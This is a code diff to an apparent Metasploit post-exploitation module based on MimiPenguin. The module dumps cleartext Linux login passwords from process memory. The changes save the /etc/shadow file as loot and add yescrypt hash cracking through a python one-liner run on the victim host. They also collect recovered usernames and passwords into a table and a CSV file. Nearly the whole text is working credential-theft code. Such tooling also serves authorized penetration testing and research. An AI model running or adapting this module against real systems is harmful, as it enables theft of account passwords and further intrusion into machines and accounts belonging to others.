@@ -24,8 +24,9 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => [
-          'Shelby Pace', # metasploit module
-          'huntergregal' # MimiPenguin
+          'huntergregal', # MimiPenguin
+          'bcoles', # original MimiPenguin module, table and python code
+          'Shelby Pace' # metasploit module
         ],
         'Platform' => [ 'linux' ],
         'Arch' => [ ARCH_X86, ARCH_X64 ],
@@ -35,6 +36,7 @@ class MetasploitModule < Msf::Post
         'References' => [
           [ 'URL', 'https://github.com/huntergregal/mimipenguin' ],
           [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/gnome-keyring/+bug/1772919' ],
+          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/lightdm/+bug/1717490' ],
           [ 'CVE', '2018-20781' ]
         ],
         'DisclosureDate' => '2018-05-23',
@@ -60,6 +62,8 @@ class MetasploitModule < Msf::Post
   def get_user_names_and_hashes
     shadow_contents = read_file('/etc/shadow')
     fail_with(Failure::UnexpectedReply, "Failed to read '/etc/shadow'") if shadow_contents.blank?
+    vprint_status('Storing shadow file...')
+    store_loot('shadow.file', 'text/plain', session, shadow_contents, nil)
 
     users = []
     lines = shadow_contents.split
@@ -90,6 +94,8 @@ class MetasploitModule < Msf::Post
         info['type'] = 'sha256'
       when '$6$'
         info['type'] = 'sha512'
+      when '$y$'
+        info['type'] = 'yescrypt'
       else
         info['type'] = 'unsupported'
       end
@@ -102,6 +108,8 @@ class MetasploitModule < Msf::Post
         cost = arr[2]
         salt = arr[3][0..21]
         info['cost'] = cost
+      elsif info['type'] == 'yescrypt'
+        salt = hash[0...29]
       else
         salt = hash.split('$')[2]
       end
@@ -236,6 +244,14 @@ class MetasploitModule < Msf::Post
     lines
   end
 
+  def get_python_version
+    @python_vers ||= command_exists?('python3') ? 'python3' : ''
+
+    if @python_vers.empty?
+      @python_vers ||= command_exists?('python') ? 'python' : ''
+    end
+  end
+
   def check_for_valid_passwords(captured_strings, user_data, process_name)
     captured_strings.each do |str|
       user_data.each do |pass_info|
@@ -252,8 +268,20 @@ class MetasploitModule < Msf::Post
           hashed = UnixCrypt::SHA256.build(str, salt)
         when 'sha512'
           hashed = UnixCrypt::SHA512.build(str, salt)
+        when 'yescrypt'
+          get_python_version
+          next if @python_vers.empty?
+
+          if @python_vers == 'python3'
+            code = "import crypt; import base64; print(crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}').decode('utf-8'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}').decode('utf-8')))"
+            cmd = "python3 -c \"#{code}\""
+          else
+            code = "import crypt; import base64; print crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}'))"
+            cmd = "python -c \"#{code}\""
+          end
+          hashed = cmd_exec(cmd).to_s.strip
         when 'unsupported'
-          fail_with(Failure::None, 'Hash type is unsupported at this time')
+          next
         end
 
         next unless hashed == hash
@@ -337,9 +365,17 @@ class MetasploitModule < Msf::Post
 
     results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
     fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?
+    print_good("Found #{results.length} valid credential(s)!")
+
+    table = Rex::Text::Table.new(
+      'Header' => 'Credentials',
+      'Indent' => 2,
+      'SortIndex' => 0,
+      'Columns' => [ 'Process Name', 'Username', 'Password' ]
+    )
 
     results.each do |res|
-      print_good("Found valid password '#{res['password']}' for user '#{res['username']}' in process '#{res['process']}'!")
+      table << [ res['process'], res['username'], res['password'] ]
       store_valid_credential(
         user: res['username'],
         private: res['password'],
@@ -347,6 +383,16 @@ class MetasploitModule < Msf::Post
       )
     end
 
-    print_good("Found #{results.length} valid credential(s)!")
+    print_line
+    print_line(table.to_s)
+    path = store_loot(
+      'mimipenguin.csv',
+      'text/plain',
+      session,
+      table.to_csv,
+      nil
+    )
+
+    print_status("Credentials stored in #{path}")
   end
 end
